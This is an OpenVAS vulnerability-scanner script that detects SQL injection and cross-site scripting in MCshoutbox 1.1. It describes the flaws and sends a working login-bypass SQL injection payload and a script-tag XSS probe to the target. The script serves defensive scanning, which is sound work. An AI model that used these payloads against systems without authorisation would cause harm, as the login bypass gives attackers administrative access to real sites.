###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mcshoutbox_sql_inj_n_xss_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# MCshoutbox Multiple SQL Injection And XSS Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to bypass the authentication
  mechanism when 'magic_quotes_gpc' is disabled or can cause arbitrary code
  execution by uploading the shell code in the context of the web application.
  Impact Level: Application";
tag_affected = "MCshoutbox version 1.1 on all running platform";
tag_insight = "- Input passed via the 'loginerror' to admin_login.php is not properly
    sanitised before being returned to the user. This can be exploited to
    execute arbitrary HTML and script code in a user's browser session in
    the context of an affected site.
  - Input passed via the 'username' and 'password' parameters to scr_login.php
    is not properly sanitised before being used in an SQL query. This can be
    exploited to manipulate SQL queries by injecting arbitrary SQL code.
  - The application does not properly check extensions of uploaded 'smilie'
    image files. This can be exploited to upload and execute arbitrary PHP code.";
tag_solution = "No solution or patch is available as of 26th October, 2009. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.maniacomputer.com/";
tag_summary = "This host is running MCshoutbox and is prone to multiple SQL
  Injection and Cross-Site Scripting vulnerabilities.";

if(description)
{
  script_id(900883);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-10-29 07:53:15 +0100 (Thu, 29 Oct 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-3714", "CVE-2009-3715");
  script_name("MCshoutbox Multiple SQL Injection and XSS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35885/");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9205");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/1961");

  script_description(desc);
  script_summary("Check through a mild verification attack on MCshoutbox");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl", "find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

boxPort = get_http_port(default:80);
if(!boxPort){
  boxPort = 80;
}

if(!get_port_state(boxPort)){
  exit(0);
}

if(!safe_checks())
{
  foreach dir (make_list("/MCshoutBox", "/shoutbox", "/box", "/", cgi_dirs()))
  {
    sndReq1 = http_get(item:string(dir, "/shoutbox.php"), port:boxPort);
    rcvRes1 = http_send_recv(port:boxPort, data:sndReq1);

    if(">Shoutbox<" >< rcvRes1 && egrep(pattern:"^HTTP/.* 200 OK",string:rcvRes1))
    {
      filename1 = string(dir + "/scr_login.php");
      filename2 = string(dir + "/admin_login.php");
      host = get_host_name();
      authVariables = "username='or''='&password='or''='";

      sndReq2 = string("POST ", filename1, " HTTP/1.1\r\n",
                       "Host: ", host, "\r\n",
                       "Referer: http://", host, filename2, "\r\n",
                       "Content-Type: application/x-www-form-urlencoded\r\n",
                       "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                        authVariables);
      rcvRes2 = http_send_recv(port:boxPort, data:sndReq2);
      if(egrep(pattern:"Location: admin.php", string:rcvRes2))
      {
        security_hole(boxPort);
        exit(0);
      }
      sndReq3 = http_get(item:string(dir, "/admin_login.php?loginerror=" +
                               "<script>alert(document.cookie)</script>"),
                         port:boxPort);
      rcvRes3 = http_send_recv(port:boxPort, data:sndReq3);
      if("><script>alert(document.cookie)</script><" >< rcvRes3){
        security_hole(boxPort);
      }
    }
  }
}
